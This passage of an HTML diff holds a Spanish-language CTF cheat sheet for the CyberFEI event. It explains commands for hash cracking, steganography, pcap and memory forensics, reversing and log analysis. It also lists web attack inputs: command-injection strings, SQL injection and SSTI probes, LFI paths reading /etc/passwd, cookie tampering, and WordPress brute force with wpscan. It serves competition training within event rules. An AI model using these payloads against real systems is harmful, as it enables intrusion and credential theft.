+<li><code>--dbs</code> = lista las bases de datos. Luego <code>-D nombre --tables</code>, <code>--dump</code>, etc.</li>
+</ul>
+<hr>
+<h2 id="4-contraseñas-y-hashes">4. Contraseñas y hashes<a class="anchor" href="#4-contraseñas-y-hashes">#</a></h2>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>hashid 'EL_HASH'</code></pre></div>
+<ul>
+<li>Te dice <strong>qué tipo de hash</strong> es (MD5, SHA1, bcrypt...). Así eliges el modo correcto.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt</code></pre></div>
+<ul>
+<li><code>hashcat</code> = rompe hashes probando palabras.</li>
+<li><code>-a 0</code> = modo diccionario. <code>-m 0</code> = tipo de hash (0 = MD5; 100 = SHA1; 1800 = sha512crypt).</li>
+<li>El último argumento es el diccionario. Saca la contraseña si está en la lista.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code></pre></div>
+<ul>
+<li><code>john</code> (John the Ripper) = lo mismo, suele detectar el tipo solo.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>zip2john archivo.zip &gt; h.txt &amp;&amp; john --wordlist=rockyou.txt h.txt</code></pre></div>
+<ul>
+<li><code>zip2john</code> convierte un ZIP con contraseña a un formato que John entiende.</li>
+<li><code>&amp;&amp;</code> = corre el segundo comando solo si el primero salió bien.</li>
+</ul>
+<hr>
+<h2 id="5-esteganografía-datos-escondidos-en-imágenesaudio">5. Esteganografía (datos escondidos en imágenes/audio)<a class="anchor" href="#5-esteganografía-datos-escondidos-en-imágenesaudio">#</a></h2>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>steghide extract -sf imagen.jpg</code></pre></div>
+<ul>
+<li><code>steghide extract</code> = saca datos ocultos de un JPG. <code>-sf</code> = archivo de origen.</li>
+<li>Te pide contraseña: prueba vacía (Enter) o palabras del reto.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>zsteg imagen.png</code></pre></div>
+<ul>
+<li>Revisa los <strong>bits menos significativos</strong> de un PNG/BMP (truco de stego clásico).</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>steghide info imagen.jpg</code></pre></div>
+<ul>
+<li>Dice si el archivo <strong>tiene algo embebido</strong> antes de extraer.</li>
+</ul>
+<p>Para audio: ábrelo en <strong>Audacity</strong> y mira el <strong>espectrograma</strong> (la flag se "dibuja").</p>
+<hr>
+<h2 id="6-capturas-de-red-pcap">6. Capturas de red (.pcap)<a class="anchor" href="#6-capturas-de-red-pcap">#</a></h2>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>tshark -r captura.pcap | head</code></pre></div>
+<ul>
+<li><code>tshark</code> = Wireshark en consola. <code>-r</code> = lee un archivo. Ves los paquetes.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>tshark -r captura.pcap -Y "http.request" -T fields -e http.host -e http.request.uri</code></pre></div>
+<ul>
+<li><code>-Y "..."</code> = filtro (aquí, solo peticiones HTTP).</li>
+<li><code>-T fields -e campo</code> = muestra solo esos campos. Útil para ver qué URLs se pidieron.</li>
+</ul>
+<p>En <strong>Wireshark</strong> (gráfico): clic derecho en un paquete → <strong>Follow &gt; TCP Stream</strong> para leer toda la conversación; <code>File &gt; Export Objects &gt; HTTP</code> para sacar archivos transferidos.</p>
+<hr>
+<h2 id="7-reversing-entender-un-binario">7. Reversing (entender un binario)<a class="anchor" href="#7-reversing-entender-un-binario">#</a></h2>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>checksec --file=BINARIO</code></pre></div>
+<ul>
+<li>Muestra las <strong>protecciones</strong> (NX, PIE, canary). Define cómo lo vas a atacar.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>ltrace ./BINARIO</code></pre></div>
+<ul>
+<li>Muestra las <strong>llamadas a librería</strong> mientras corre. Un <code>strcmp(tuEntrada, "clave")</code> te revela la contraseña.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>./BINARIO; echo $?</code></pre></div>
+<ul>
+<li>Lo corres y <code>echo $?</code> imprime el código de salida (0 = ok). Para ver cómo reacciona.</li>
+</ul>
+<p>Para leer el código: abre el binario en <strong>Ghidra</strong> (<code>ghidra</code>), impórtalo, doble clic en <code>main</code> → te da pseudo-C.</p>
+<hr>
+<h2 id="8-decodificar-texto-raro-base64-hex-rot">8. Decodificar texto raro (base64, hex, rot...)<a class="anchor" href="#8-decodificar-texto-raro-base64-hex-rot">#</a></h2>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>echo "dGV4dG8=" | base64 -d</code></pre></div>
+<ul>
+<li><code>base64 -d</code> = decodifica. (Sin <code>-d</code> codifica.) El <code>=</code> al final delata base64.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>echo "74657874" | xxd -r -p</code></pre></div>
+<ul>
+<li><code>xxd -r -p</code> = convierte <strong>hex a texto</strong> (<code>-r</code> revierte, <code>-p</code> formato plano).</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>echo "GUVKByB" | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code></pre></div>
+<ul>
+<li><code>tr</code> = sustituye caracteres. Esto es <strong>ROT13</strong> (corre el alfabeto 13 lugares).</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>echo -n "texto" | base64          # codificar
+echo -n "texto" | md5sum          # sacar su MD5</code></pre></div>
+<ul>
+<li><code>-n</code> = sin salto de línea al final (importante, cambia el hash).</li>
+</ul>
+<p>Para algo visual y sin instalar nada raro: clona <strong>CyberChef</strong> antes del evento y abre su HTML en el navegador (funciona offline).</p>
+<hr>
+<h2 id="9-buscar-la-flag-en-todo-un-directorio">9. Buscar la flag en todo un directorio<a class="anchor" href="#9-buscar-la-flag-en-todo-un-directorio">#</a></h2>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>grep -raoiE '[A-Za-z0-9_]+\{[^}]+\}' .</code></pre></div>
+<ul>
+<li><code>grep</code> busca texto. <code>-r</code> = recursivo (entra a subcarpetas). <code>-a</code> = trata binarios como texto.</li>
+<li><code>-o</code> = muestra solo lo que coincide. <code>-i</code> = ignora mayúsculas. <code>-E</code> = regex.</li>
+<li><code>'[A-Za-z0-9_]+\{[^}]+\}'</code> = el patrón típico de bandera <code>palabra{...}</code>.</li>
+<li><code>.</code> = la carpeta actual. <strong>Barre todo buscando la flag de un golpe.</strong></li>
+</ul>
+<hr>
+<h2 id="reglas-del-día">Reglas del día<a class="anchor" href="#reglas-del-día">#</a></h2>
+<ul>
+<li>Ataca <strong>solo</strong> la infraestructura del reto, nunca la plataforma del evento ni a otros (salvo Attack-Defense).</li>
+<li>Confirma el <strong>formato de la flag</strong> (<code>flag{...}</code> o <code>CyberFEI{...}</code>) y úsalo en tus <code>grep</code>.</li>
+<li>Regla de los 20 min: atorado 20 min → pide ayuda o cambia de reto.</li>
+<li>Baja fruta primero: ordena por puntaje, empieza por lo fácil.</li>
+<li>Último 30 min: congela exploración y <strong>pule writeups</strong>.</li>
+<li>Anota cada comando que te sirvió: es tu write-up y tu chuleta para la próxima.</li>
+</ul>
+<hr>
+<hr>
+<h1 id="parte-2-aportes-de-la-guía-de-tu-compañero-cyberfei-30">PARTE 2 — Aportes de la guía de tu compañero (CYBERFEI 3.0)<a class="anchor" href="#parte-2-aportes-de-la-guía-de-tu-compañero-cyberfei-30">#</a></h1>
+<p>Lo que sigue complementa lo de arriba. Mismo criterio: puro comando explicado.</p>
+<h2 id="10-triage-el-reflejo-universal-corre-esto-siempre-primero">10. Triage — el reflejo universal (corre esto SIEMPRE primero)<a class="anchor" href="#10-triage-el-reflejo-universal-corre-esto-siempre-primero">#</a></h2>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>strings -n 6 ARCHIVO | grep -iE 'flag|cyberfei|ctf'</code></pre></div>
+<ul>
+<li>Muchísimas banderas "difíciles" estaban en texto plano todo el tiempo. Antes de abrir herramientas pesadas, corre esto.</li>
+</ul>
+<div class="tablewrap"><table><thead><tr><th>Te dan…</th><th>Primer reflejo</th></tr></thead><tbody><tr><td>Archivo cualquiera</td><td><code>file</code> → <code>strings -n6</code> → <code>exiftool</code> → <code>binwalk</code></td></tr><tr><td>Imagen</td><td>estego: <code>zsteg</code>/<code>steghide</code> + Stegsolve (+ espectro si es audio)</td></tr><tr><td>Texto raro</td><td>CyberChef "Magic"; ¿base64/hex/rot?</td></tr><tr><td><code>.pcap</code></td><td>Wireshark → Follow Stream → Export Objects</td></tr><tr><td>URL/puerto</td><td><code>nmap</code>, DevTools, ver fuente, <code>robots.txt</code></td></tr><tr><td>Binario ELF</td><td><code>file</code>, <code>strings</code>, <code>checksec</code>, Ghidra</td></tr><tr><td>Dump de RAM</td><td>Volatility 3: <code>windows.info</code></td></tr></tbody></table></div>
+<h2 id="11-guardar-evidencia-clave-para-el-writeup-40-pts">11. Guardar evidencia (clave para el writeup = 40 pts)<a class="anchor" href="#11-guardar-evidencia-clave-para-el-writeup-40-pts">#</a></h2>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>script -t sesion.log</code></pre></div>
+<ul>
+<li><code>script</code> <strong>graba toda la terminal</strong> (comandos y salidas) a un archivo. Ctrl-D para cerrar. Actívalo al empezar cada reto y ya no reconstruyes nada.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>history &gt; comandos.txt</code></pre></div>
+<ul>
+<li>Vuelca los comandos que usaste.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>flameshot gui</code></pre></div>
+<ul>
+<li>Captura de pantalla rápida (para pegar el momento en que sale la flag).</li>
+</ul>
+<h2 id="12-tráfico-tcpdump-y-tshark-además-de-wireshark">12. Tráfico — tcpdump y tshark (además de Wireshark)<a class="anchor" href="#12-tráfico-tcpdump-y-tshark-además-de-wireshark">#</a></h2>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>tcpdump -r cap.pcap -nn</code></pre></div>
+<ul>
+<li><code>-r</code> lee un archivo. <code>-nn</code> = no resolver nombres/puertos (más rápido y claro).</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>tcpdump -r cap.pcap -A | grep -i flag</code></pre></div>
+<ul>
+<li><code>-A</code> = muestra el payload en <strong>ASCII</strong>. Lo filtras por "flag".</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>tcpdump -r cap.pcap 'port 21'</code></pre></div>
+<ul>
+<li>Filtro <strong>BPF</strong> de captura (<code>host</code>, <code>port</code>, <code>tcp</code>, <code>and</code>/<code>or</code>). Ojo: los filtros BPF <strong>no</strong> son los de display de Wireshark.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>tshark -r cap.pcap --export-objects http,./out</code></pre></div>
+<ul>
+<li>Extrae todos los archivos HTTP transferidos a la carpeta <code>./out</code>.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>tshark -r cap.pcap -T fields -e data | xxd -r -p | strings | grep -i flag</code></pre></div>
+<ul>
+<li>Saca el campo <code>data</code> crudo → lo pasa de hex a bytes → texto → busca la flag.</li>
+</ul>
+<p><strong>Qué buscar en un pcap:</strong> credenciales en claro (FTP/Telnet/HTTP Basic), <strong>DNS exfil</strong> (subdominios larguísimos = datos en base32/hex), <strong>ICMP</strong> con payload raro, <strong>USB-HID</strong> (teclas que hay que decodificar), y si dan keylog TLS: Wireshark → Preferences → TLS → (Pre)-Master-Secret.</p>
+<h2 id="13-reversing-gdb-y-radare2-entrar-al-binario">13. Reversing — gdb y radare2 (entrar al binario)<a class="anchor" href="#13-reversing-gdb-y-radare2-entrar-al-binario">#</a></h2>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>checksec --file=BINARIO</code></pre></div>
+<ul>
+<li>Protecciones (NX, PIE, canary): definen cómo lo atacas.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>ltrace ./BINARIO</code></pre></div>
+<ul>
+<li>Llamadas a librería; un <code>strcmp(tuInput,"clave")</code> te revela la contraseña.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>gdb ./BINARIO</code></pre></div>
+<p>Dentro de gdb:</p>
+<ul>
+<li><code>break main</code> = pausa al entrar a main. <code>run</code> = ejecuta. <code>info functions</code> = lista funciones.</li>
+<li><code>x/20i $pc</code> = muestra 20 instrucciones desde donde está parado. <code>c</code> = continuar.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>r2 -A BINARIO</code></pre></div>
+<ul>
+<li><code>radare2</code> con análisis. Dentro: <code>aaa</code> (analiza), <code>afl</code> (lista funciones), <code>pdf @ main</code> (desensambla main), <code>iz</code> (strings).</li>
+<li>Para leer pseudo-C cómodo: <strong>Ghidra</strong> → importar → analizar todo → doble clic en <code>main</code>.</li>
+</ul>
+<h2 id="14-forense-de-memoria-volatility-3">14. Forense de memoria — Volatility 3<a class="anchor" href="#14-forense-de-memoria-volatility-3">#</a></h2>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>vol -f dump.mem windows.info</code></pre></div>
+<ul>
+<li><code>-f</code> = el volcado de RAM. <code>windows.info</code> = perfil/SO. <strong>Siempre el primero.</strong></li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>vol -f dump.mem windows.pslist      # procesos
+vol -f dump.mem windows.pstree      # árbol de procesos
+vol -f dump.mem windows.cmdline     # líneas de comando tecleadas
+vol -f dump.mem windows.filescan | grep -i flag
+vol -f dump.mem windows.hashdump    # hashes de usuarios
+vol -f dump.mem windows.netscan     # conexiones de red</code></pre></div>
+<ul>
+<li>Para Linux usa los plugins <code>linux.*</code> (bash history, pslist). Busca procesos raros y el historial.</li>
+</ul>
+<h2 id="15-forense-de-disco-sleuth-kit-y-carving">15. Forense de disco — Sleuth Kit y carving<a class="anchor" href="#15-forense-de-disco-sleuth-kit-y-carving">#</a></h2>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>mmls disco.img</code></pre></div>
+<ul>
+<li>Tabla de particiones (te da el <strong>OFFSET</strong> que usas abajo).</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>fls -r -o OFFSET disco.img</code></pre></div>
+<ul>
+<li>Lista archivos, <strong>incluidos borrados</strong> (<code>-r</code> recursivo, <code>-o</code> el offset de la partición).</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>icat -o OFFSET disco.img INODO &gt; recuperado</code></pre></div>
+<ul>
+<li>Recupera un archivo por su número de inodo.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>foremost -i disco.img -o salida/</code></pre></div>
+<ul>
+<li><strong>File carving</strong>: recupera archivos por su firma, aunque no haya tabla.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>binwalk --dd='.*' ARCHIVO</code></pre></div>
+<ul>
+<li>Extrae todo lo que binwalk reconozca por firma.</li>
+</ul>
+<h2 id="16-blue-team-análisis-de-logs-grep-razonar">16. Blue Team — análisis de logs (grep + razonar)<a class="anchor" href="#16-blue-team-análisis-de-logs-grep-razonar">#</a></h2>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>grep -i "flag" *.log</code></pre></div>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>awk '{print $1}' access.log | sort | uniq -c | sort -rn | head</code></pre></div>
+<ul>
+<li><code>awk '{print $1}'</code> saca la <strong>primera columna</strong> (IP) de cada línea. <code>sort | uniq -c</code> cuenta repetidas. <code>sort -rn | head</code> = las más frecuentes → posible atacante.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>grep "Failed password" auth.log | awk '{print $11}' | sort | uniq -c</code></pre></div>
+<ul>
+<li>Cuenta intentos fallidos por origen → fuerza bruta.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>cat eventos.json | jq '.[] | select(.event=="login")'</code></pre></div>
+<ul>
+<li><code>jq</code> filtra JSON. Aquí, solo los eventos de login.</li>
+</ul>
+<p><strong>Patrones:</strong> fuerza bruta (muchos fallos y luego un éxito desde la misma IP), web attack (<code>../</code>, <code>UNION</code>, <code>&lt;script&gt;</code> en <code>access.log</code>), exfil (respuestas enormes, user-agents raros), persistencia (usuarios/cron nuevos).</p>
+<h2 id="17-web-lo-que-faltaba-inyección-manual-100-estilo">17. Web — lo que faltaba (inyección MANUAL = 100% estilo)<a class="anchor" href="#17-web-lo-que-faltaba-inyección-manual-100-estilo">#</a></h2>
+<h3 id="command-injection-cuando-un-campo-ejecuta-comandos-del-sistema">Command injection (cuando un campo ejecuta comandos del sistema)<a class="anchor" href="#command-injection-cuando-un-campo-ejecuta-comandos-del-sistema">#</a></h3>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre><code>127.0.0.1; ls
+127.0.0.1 &amp;&amp; cat flag.txt
+`id`    $(id)    | whoami</code></pre></div>
+<ul>
+<li><code>;</code> encadena, <code>&amp;&amp;</code> corre si lo anterior salió bien, `<code> </code>id<code> </code><code> y </code>$(id)<code> ejecutan y sustituyen, </code>|` encadena salida.</li>
+</ul>
+<h3 id="ssti-inyección-de-plantillas">SSTI — inyección de plantillas<a class="anchor" href="#ssti-inyección-de-plantillas">#</a></h3>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre><code>{{7*7}}     ${7*7}     #{7*7}</code></pre></div>
+<ul>
+<li>Si la página te devuelve <code>49</code>, es inyectable (está evaluando tu expresión).</li>
+</ul>
+<h3 id="sql-injection-manual-detectar">SQL injection manual (detectar)<a class="anchor" href="#sql-injection-manual-detectar">#</a></h3>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre><code>' OR '1'='1
+admin'--
+' ORDER BY 3--              (descubre nº de columnas)
+' UNION SELECT 1,2,3--
+' UNION SELECT table_name,2,3 FROM information_schema.tables--</code></pre></div>
+<ul>
+<li>Hazlo <strong>a mano</strong> y documéntalo: <code>sqlmap</code> lo automatiza pero es <strong>zona gris</strong> (regla 5).</li>
+</ul>
+<h3 id="lfi-leer-el-fuente-php">LFI / leer el fuente PHP<a class="anchor" href="#lfi-leer-el-fuente-php">#</a></h3>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre><code>?file=../../../../etc/passwd
+?file=php://filter/convert.base64-encode/resource=index.php</code></pre></div>
+<ul>
+<li>El wrapper <code>php://filter</code> te entrega el PHP en base64 (ahí suele estar la flag).</li>
+</ul>
+<h3 id="jwt-tokens-eyj">JWT (tokens <code>eyJ...</code>)<a class="anchor" href="#jwt-tokens-eyj">#</a></h3>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>echo 'PARTE_DEL_MEDIO' | base64 -d 2&gt;/dev/null</code></pre></div>
+<ul>
+<li>Decodifica el payload. Debilidades: <code>alg:none</code>, o firma HS256 con secreto débil → <code>hashcat -m 16500</code>.</li>
+</ul>
+<h3 id="cookies">Cookies<a class="anchor" href="#cookies">#</a></h3>
+<ul>
+<li><code>role=user</code> → cámbialo a <code>admin</code>; <code>auth=0</code> → <code>1</code>; si está en base64, decodifica, edita y recodifica.</li>
+</ul>
+<h3 id="gtfobins">GTFOBins<a class="anchor" href="#gtfobins">#</a></h3>
+<ul>
+<li>Descárgalo hoy: catálogo de <strong>cómo abusar de binarios SUID/permitidos</strong> para leer archivos o escalar.</li>
+</ul>
+<h2 id="18-criptoestego-lo-que-faltaba">18. Cripto/estego — lo que faltaba<a class="anchor" href="#18-criptoestego-lo-que-faltaba">#</a></h2>
+<h3 id="hashcat-por-modo">hashcat por modo<a class="anchor" href="#hashcat-por-modo">#</a></h3>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>hashcat -m 0 h.txt rockyou.txt      # 0=MD5 100=SHA1 1400=SHA256 1800=sha512crypt 3200=bcrypt 1000=NTLM 16500=JWT
+hashcat -m 0 h.txt -a 3 '?d?d?d?d'  # -a 3 = máscara; ?d un dígito (prueba 0000-9999)</code></pre></div>
+<h3 id="john-por-formato">john por formato<a class="anchor" href="#john-por-formato">#</a></h3>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>john --format=raw-md5 --wordlist=rockyou.txt h.txt &amp;&amp; john --show h.txt</code></pre></div>
+<h3 id="archivos-protegidos-a-formato-de-john">Archivos protegidos → a formato de john<a class="anchor" href="#archivos-protegidos-a-formato-de-john">#</a></h3>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>zip2john a.zip &gt; h.txt   # también pdf2john, rar2john, ssh2john</code></pre></div>
+<h3 id="estego-en-texto-contenedores">Estego en texto / contenedores<a class="anchor" href="#estego-en-texto-contenedores">#</a></h3>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>cat -A nota.txt | head</code></pre></div>
+<ul>
+<li><code>-A</code> hace visibles <strong>tabs (<code>^I</code>) y fines de línea (<code>$</code>)</strong> → delata estego de espacios/tabs. Para unicode zero-width, pásalo por CyberChef.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>unzip -l doc.docx</code></pre></div>
+<ul>
+<li>Un docx/xlsx <strong>es un ZIP</strong>: renómbralo y míralo por dentro.</li>
+</ul>
+<h3 id="estego-en-imagenqraudio">Estego en imagen/QR/audio<a class="anchor" href="#estego-en-imagenqraudio">#</a></h3>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>zbarimg qr.png            # lee un QR
+pngcheck -v img.png       # PNG corrupto: a veces ocultan datos en alto/ancho
+convert img.png -auto-level out.png   # sube contraste (ImageMagick) para imagen "plana"
+zsteg -a img.png          # todas las capas LSB de un PNG/BMP</code></pre></div>
+<ul>
+<li>Audio sin razón aparente → casi siempre <strong>espectrograma</strong> (ábrelo en Audacity/Sonic Visualiser, vista de espectro).</li>
+</ul>
+<hr>
+<h1 id="parte-3-lo-que-pediste-wpscan-searchsploit-e-inyección">PARTE 3 — Lo que pediste: wpscan, searchsploit e inyección<a class="anchor" href="#parte-3-lo-que-pediste-wpscan-searchsploit-e-inyección">#</a></h1>
+<h2 id="wpscan-enumerar-wordpress-zona-gris-pregunta-antes">wpscan — enumerar WordPress  ⚠️ ZONA GRIS (pregunta antes)<a class="anchor" href="#wpscan-enumerar-wordpress-zona-gris-pregunta-antes">#</a></h2>
+<p>Es un escáner <strong>automatizado</strong>; por la regla 5 confirma con los organizadores. Necesita su base de datos descargada <strong>hoy</strong> (<code>wpscan --update</code> con internet).</p>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>wpscan --url http://OBJETIVO</code></pre></div>
+<ul>
+<li>Enumera versión de WordPress, plugins y temas (donde suele estar la vulnerabilidad).</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>wpscan --url http://OBJETIVO --enumerate u</code></pre></div>
+<ul>
+<li><code>--enumerate u</code> = lista <strong>usuarios</strong> válidos.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>wpscan --url http://OBJETIVO --enumerate vp,vt</code></pre></div>
+<ul>
+<li><code>vp</code> = plugins vulnerables, <code>vt</code> = temas vulnerables.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>wpscan --url http://OBJETIVO -U usuarios.txt -P rockyou.txt</code></pre></div>
+<ul>
+<li><code>-U</code>/<code>-P</code> = fuerza bruta de login (usuarios/contraseñas). Solo si las reglas lo permiten.</li>
+</ul>
+<p><strong>Equivalente manual (más seguro de estilo):</strong> mira <code>/wp-login.php</code>, <code>/wp-json/wp/v2/users</code> (lista usuarios), y <code>readme.html</code> o el <code>&lt;meta name="generator"&gt;</code> del fuente para la versión.</p>
+<h2 id="searchsploit-buscar-exploits-sin-internet-es-local">searchsploit — buscar exploits SIN internet  ✅ (es local)<a class="anchor" href="#searchsploit-buscar-exploits-sin-internet-es-local">#</a></h2>
+<p>Es la base de datos <strong>ExploitDB local</strong>. Descárgala hoy (<code>sudo apt install exploitdb</code>). Solo busca y copia exploits, no ataca solo → no es zona gris.</p>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>searchsploit wordpress 5.8</code></pre></div>
+<ul>
+<li>Busca exploits conocidos para ese software/versión (la que te dio <code>wpscan</code>/<code>nmap -sV</code>).</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>searchsploit -t apache</code></pre></div>
+<ul>
+<li><code>-t</code> = busca solo en el <strong>título</strong> (menos ruido).</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>searchsploit -x php/webapps/12345.txt</code></pre></div>
+<ul>
+<li><code>-x</code> = <strong>abre</strong> ese exploit para leerlo (la ruta sale en la búsqueda).</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>searchsploit -m php/webapps/12345.py</code></pre></div>
+<ul>
+<li><code>-m</code> = <strong>copia</strong> el exploit a tu carpeta actual para estudiarlo/adaptarlo.</li>
+</ul>
+<blockquote>Flujo típico: <code>nmap -sV</code> o <code>wpscan</code> te dan servicio+versión → <code>searchsploit &lt;servicio versión&gt;</code> → lees el exploit → lo adaptas <strong>tú</strong> (regla 3: adaptarlo y entenderlo cuenta como trabajo propio; copiar y pegar a ciegas, no).</blockquote>
+<h2 id="inyección-resumen-prioriza-siempre-lo-manual">Inyección — resumen (prioriza SIEMPRE lo manual)<a class="anchor" href="#inyección-resumen-prioriza-siempre-lo-manual">#</a></h2>
+<p>Ya está arriba en la sección 17. En corto:</p>
+<div class="tablewrap"><table><thead><tr><th>Tipo</th><th>Prueba de detección</th><th>Manual (100% estilo)</th><th>Automático (zona gris)</th></tr></thead><tbody><tr><td><strong>SQLi</strong></td><td><code>' OR '1'='1</code>, <code>' ORDER BY N--</code></td><td><code>UNION SELECT ...</code> a mano</td><td><code>sqlmap</code></td></tr><tr><td><strong>Command inj.</strong></td><td><code>; id</code>, <code>&amp;&amp; cat flag.txt</code>, <code>$(id)</code></td><td>encadenar comandos</td><td>—</td></tr><tr><td><strong>SSTI</strong></td><td><code>{{7*7}}</code> → ¿<code>49</code>?</td><td>leer config/RCE a mano</td><td>—</td></tr><tr><td><strong>LFI</strong></td><td><code>?file=../../etc/passwd</code></td><td><code>php://filter</code> para el fuente</td><td>—</td></tr></tbody></table></div>
+<p>Regla de oro del evento: detecta y explota <strong>a mano</strong>, pega el <strong>request exacto + la respuesta con la bandera</strong> en el writeup. Eso puntúa más que cualquier herramienta automática.</p>
+<hr>
+<h1 id="parte-4-inyección-de-shell-y-feroxbuster">PARTE 4 — Inyección de shell y feroxbuster<a class="anchor" href="#parte-4-inyección-de-shell-y-feroxbuster">#</a></h1>
+<h2 id="19-feroxbuster-ferro-descubrir-rutas-pero-recursivo">19. feroxbuster ("ferro") — descubrir rutas, pero RECURSIVO<a class="anchor" href="#19-feroxbuster-ferro-descubrir-rutas-pero-recursivo">#</a></h2>
+<p>Es un fuzzer de directorios/archivos como gobuster/ffuf, pero su gracia es que <strong>baja solo</strong> por las carpetas que va encontrando. Va en los paquetes de la guía de tu compañero. Para qué: encontrar <code>/admin</code>, <code>/backup</code>, <code>/uploads/secret/flag.txt</code>, etc.</p>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>feroxbuster -u http://OBJETIVO</code></pre></div>
+<ul>
+<li><code>-u</code> = la URL base. Sin más, ya fuzzea y entra recursivamente en lo que halla.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>feroxbuster -u http://OBJETIVO -w /usr/share/wordlists/dirb/common.txt</code></pre></div>
+<ul>
+<li><code>-w</code> = el diccionario de nombres a probar.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>feroxbuster -u http://OBJETIVO -x php,txt,bak -d 2</code></pre></div>
+<ul>
+<li><code>-x</code> = prueba además esas <strong>extensiones</strong> (<code>index.php</code>, <code>config.bak</code>…).</li>
+<li><code>-d 2</code> = <strong>profundidad</strong> de recursión = 2 niveles (evita que se vaya eternamente).</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>feroxbuster -u http://OBJETIVO -C 404,403 -o ferox.txt</code></pre></div>
+<ul>
+<li><code>-C</code> = <strong>oculta</strong> esos códigos de estado (filtra el ruido del "404 bonito").</li>
+<li><code>-o</code> = guarda la salida a archivo → evidencia para el writeup.</li>
